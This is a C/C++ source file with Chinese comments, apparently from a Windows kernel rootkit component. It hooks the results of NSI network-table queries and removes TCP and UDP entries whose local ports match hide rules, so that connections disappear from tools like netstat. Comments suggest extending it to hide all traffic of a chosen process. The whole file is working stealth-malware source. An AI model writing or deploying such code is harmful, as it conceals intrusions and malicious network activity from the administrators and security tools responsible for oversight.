#include "Hide.h"
#include "Rules.h"

bool g_IsHide;//隐藏的总开关。


//////////////////////////////////////////////////////////////////////////////////////////////////


bool IsHideUdp(_In_ PUdpTable Entry)
/*
功能：识别是不是要隐藏的信息。

后期还可以考虑加参数，如：进程等。
*/
{
    bool ret = false;

    if (IsHideLocalPort(RtlUshortByteSwap(Entry->LocalPort))) {
        ret = true;
    }

    return ret;
}


bool IsHideTcp(_In_ PTcpTable Entry)
/*
功能：识别是不是要隐藏的信息。

后期还可以考虑加参数，如：进程等。
*/
{
    bool ret = false;

    if (IsHideLocalPort(RtlUshortByteSwap(Entry->LocalPort))) {
        ret = true;
    }

    /*
    还可以继续添加别的，如：IPv4/6.
    关系是和。
    */

    return ret;
}


void HideUdpInfo(_In_ PNsiParameters NsiParam)
/*
功能：隐藏UDP网络信息，如：本地端口。

高级做法：隐藏某个进程的所有的网络的通讯信息。

做法：
移除p1,p2,StateInfo,p4里的相应的节点元素信息即可。
最后不要忘了，减少Counter成员的值。
*/
{
    if (nullptr == NsiParam) {
        return;
    }

    if (0 == NsiParam->Counter) {
        return;
    }

    PUdpTable Table = (PUdpTable)NsiParam->p1;
    PBYTE p2 = (PBYTE)NsiParam->p2;
    PStateTable State = (PStateTable)NsiParam->StateInfo;
    PProcessTable Module = (PProcessTable)NsiParam->ProcessInfo;

    for (ULONG i = 0; i < NsiParam->Counter; i++) {
        bool IsHide = false;

        if (NsiParam->p1) {
            IsHide = IsHideUdp(Table);
            if (IsHide) {
                //移动这个元素后面的数据到这个元素的位置。
                memmove(Table, Table + 1, NsiParam->size1 * (NsiParam->Counter - i));
                NsiParam->Counter--;
            }

            Table++;
        }

        if (NsiParam->p2) {
            //如果上面的匹配了，这里也应移除下。
            //这里也可以匹配下。

            if (IsHide) {
                memmove(p2, p2 + NsiParam->size2, NsiParam->size2 * (NsiParam->Counter - i));
            }

            p2 += NsiParam->size2;
        }

        if (NsiParam->StateInfo) {
            //如果上面的匹配了，这里也应移除下。
            //这里也可以匹配下。

            if (IsHide) {
                memmove(State, State + 1, NsiParam->size3 * (NsiParam->Counter - i));
            }

            State++;
        }

        if (NsiParam->ProcessInfo) {
            //如果上面的匹配了，这里也应移除下。
            //这里也可以匹配下。

            if (IsHide) {
                memmove(Module, Module + 1, NsiParam->size4 * (NsiParam->Counter - i));
            }

            Module++;
        }
    }

    //更新Counter的值。如果已经更新，这里忽略。
    //NsiParam->Counter = XXX。
}


void HideTcpInfo(_In_ PNsiParameters NsiParam)
/*
功能：隐藏Tcp网络信息，如：本地端口，远端IP(v4/6)。

高级做法：隐藏某个进程的所有的网络的通讯信息。

做法：
移除p1,p2,StateInfo,p4里的相应的节点元素信息即可。
最后不要忘了，减少Counter成员的值。

可以考虑：把HideTcpInfo和HideUdpInfo合并为模板。
*/
{
    if (nullptr == NsiParam) {
        return;
    }

    if (0 == NsiParam->Counter) {
        return;
    }

    PTcpTable Table = (PTcpTable)NsiParam->p1;
    PBYTE p2 = (PBYTE)NsiParam->p2;
    PStateTable State = (PStateTable)NsiParam->StateInfo;
    PProcessTable Module = (PProcessTable)NsiParam->ProcessInfo;

    for (ULONG i = 0; i < NsiParam->Counter; i++) {
        bool IsHide = false;

        if (NsiParam->p1) {
            IsHide = IsHideTcp(Table);
            if (IsHide) {
                //移动这个元素后面的数据到这个元素的位置。
                memmove(Table, Table + 1, NsiParam->size1 * (NsiParam->Counter - i));
                NsiParam->Counter--;
            }

            Table++;
        }

        if (NsiParam->p2) {
            //如果上面的匹配了，这里也应移除下。
            //这里也可以匹配下。

            if (IsHide) {
                memmove(p2, p2 + NsiParam->size2, NsiParam->size2 * (NsiParam->Counter - i));
            }

            p2 += NsiParam->size2;
        }

        if (NsiParam->StateInfo) {
            //如果上面的匹配了，这里也应移除下。
            //这里也可以匹配下。

            if (IsHide) {
                memmove(State, State + 1, NsiParam->size3 * (NsiParam->Counter - i));
            }

            State++;
        }

        if (NsiParam->ProcessInfo) {
            //如果上面的匹配了，这里也应移除下。
            //这里也可以匹配下。

            if (IsHide) {
                memmove(Module, Module + 1, NsiParam->size4 * (NsiParam->Counter - i));
            }

            Module++;
        }
    }

    //更新Counter的值。如果已经更新，这里忽略。
    //NsiParam->Counter = XXX。
}
